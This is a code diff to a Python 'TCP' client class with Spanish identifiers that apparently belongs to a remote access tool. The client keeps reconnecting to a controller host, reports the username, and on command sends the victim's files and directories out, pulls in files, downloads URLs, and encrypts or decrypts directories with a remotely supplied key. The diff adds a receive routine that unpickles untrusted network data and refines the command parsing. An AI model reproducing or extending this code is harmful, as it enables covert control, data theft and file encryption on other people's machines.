@@ -15,6 +15,7 @@ class TCP:
     def __init__(self, host, port):
         self.__host = host
         self.__port = port
+        self.__chunk = 4194304
 
     def conectar(self):
         while True:
@@ -23,7 +24,6 @@ class TCP:
                 self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
                 self.__sock.connect((self.__host, self.__port))
-                self.__chunk = int(self.__sock.recv(1024).decode())
 
                 sleep(0.05)
                 userName = getpass.getuser()
@@ -57,17 +57,37 @@ class TCP:
         info = struct.pack('Q', len(info))+info
         self.__sock.sendall(info)
 
+    def recibirDatos(self):
+        data = b''
+        size = struct.calcsize('Q')
+        while len(data) < size:
+            info = self.__sock.recv(self.__chunk)
+            data += info
+
+        dataSize = data[:size]
+        data = data[size:]
+        byteSize = struct.unpack('Q', dataSize)[0]
+
+        while len(data) < byteSize:
+            data += self.__sock.recv(self.__chunk)
+
+        info = data[:byteSize]
+        data = data[byteSize:]
+        info = pickle.loads(info)
+
+        return info
+
     def enviarArchivo(self, ubicacion):
         sleep(0.05)
-        tam = os.path.getsize(ubicacion)
-        paquetes = int(tam/self.__chunk)
+        peso = os.path.getsize(ubicacion)
+        paquetes = int(peso/self.__chunk)
         self.__sock.send(str(paquetes).encode())
 
         sleep(0.1)
         with open(ubicacion, 'rb') as archivo:
             info = archivo.read(self.__chunk)
             while info:
-                self.__sock.send(info)
+                self.enviarDatos(info)
                 info = archivo.read(self.__chunk)
                 sleep(0.05)
         archivo.close()
@@ -75,7 +95,7 @@ class TCP:
     def recibirArchivo(self, ubicacion):
         with open(ubicacion, 'wb') as archivo:
             while True:
-                info = self.__sock.recv(self.__chunk)
+                info = self.recibirDatos()
                 archivo.write(info)
 
                 if len(info) < self.__chunk:
@@ -106,6 +126,9 @@ class TCP:
             res = self.__sock.recv(1024).decode()
             if res == 'S':
                 self.enviarArchivo(archivos[index-1])
+                msg = self.__sock.recv(1024).decode()
+                if msg == "error":
+                    break
             elif res == "quit":
                 break
             else:
@@ -126,8 +149,13 @@ class TCP:
             res = self.__sock.recv(1024).decode()
 
             if res == 'S':
-                nombre = self.__sock.recv(1024).decode()
-                self.recibirArchivo(f"{destino}/{nombre}")
+                try:
+                    nombre = self.__sock.recv(1024).decode()
+                    self.recibirArchivo(f"{destino}/{nombre}")
+                    self.__sock.send("ok".encode())
+                except:
+                    self.__sock.send("error: Error al recibir el archivo (sdt)".encode())
+                    break
             elif res == "quit":
                 break
             else:
@@ -144,7 +172,7 @@ class TCP:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
     def sendFileFrom(self, cmd):
-        if re.search("-d", cmd):
+        if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
 
             if os.path.isfile(origen):
@@ -169,7 +197,7 @@ class TCP:
                 self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
 
     def sendFileTo(self, cmd):
-        if re.search("-d", cmd):
+        if re.search("-d[= ]", cmd):
             destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
             self.recibirArchivo(destino)
 
@@ -178,7 +206,7 @@ class TCP:
             self.recibirArchivo(destino)
 
     def image(self, cmd):
-        if re.search("-r", cmd):
+        if re.search("-r[= ]", cmd):
             imagenes = []
             for i in os.listdir(os.getcwd()):
                 archivo = f"{os.getcwd()}/{i}"
@@ -189,7 +217,7 @@ class TCP:
             imagen = imagenes[num]
 
         else:
-            if re.search("-t", cmd):
+            if re.search("-t[= ]", cmd):
                 imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
             else:
                 imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
@@ -211,9 +239,9 @@ class TCP:
             self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
 
     def sendDirFrom(self, cmd):
-        if re.search("-d", cmd):
+        if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
-            if re.search("-i", cmd):
+            if re.search("-i[= ]", cmd):
                 index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                 if index <= 0:
                     index = 1
@@ -228,7 +256,7 @@ class TCP:
                 self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())
 
         else:
-            if re.search("-i", cmd):
+            if re.search("-i[= ]", cmd):
                 origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                 index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                 if index <= 0:
@@ -247,8 +275,8 @@ class TCP:
                 self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())
 
     def sendDirTo(self, cmd):
-        if re.search("-d", cmd):
-            if re.search("-i", cmd):
+        if re.search("-d[= ]", cmd):
+            if re.search("-i[= ]", cmd):
                 destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                 index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                 if index <= 0:
@@ -260,7 +288,7 @@ class TCP:
             self.recibirDirectorio(destino, index)
 
         else:
-            if re.search("-i", cmd):
+            if re.search("-i[= ]", cmd):
                 index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                 if index <= 0:
                     index = 1
@@ -271,7 +299,7 @@ class TCP:
             self.recibirDirectorio(destino, index)
 
     def comprimir(self, cmd):
-        if re.search("-d", cmd):
+        if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
             destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
         else:
@@ -304,7 +332,7 @@ class TCP:
         self.__sock.send(info.encode())
 
     def descomprimir(self, cmd):
-        if re.search("-d", cmd):
+        if re.search("-d[= ]", cmd):
             origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
             destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
         else:
@@ -379,7 +407,7 @@ class TCP:
     def decrypt(self, cmd):
         key = self.__sock.recv(1024)
         directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
-        if re.search("-k", cmd):
+        if re.search("-k[= ]", cmd):
             clave = directorio
         else:
             clave = self.__sock.recv(1024).decode()
@@ -435,7 +463,8 @@ class TCP:
         extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
             "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
         extensionesUpper = [i.upper() for i in extensiones]
-        if re.search("-n", cmd):
+
+        if re.search("-n[= ]", cmd):
             url = re.findall("-u[= ]([a-zA-Z0-9./ ].*) -n", cmd)[0]
             nombre = re.findall("-n[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
         else:
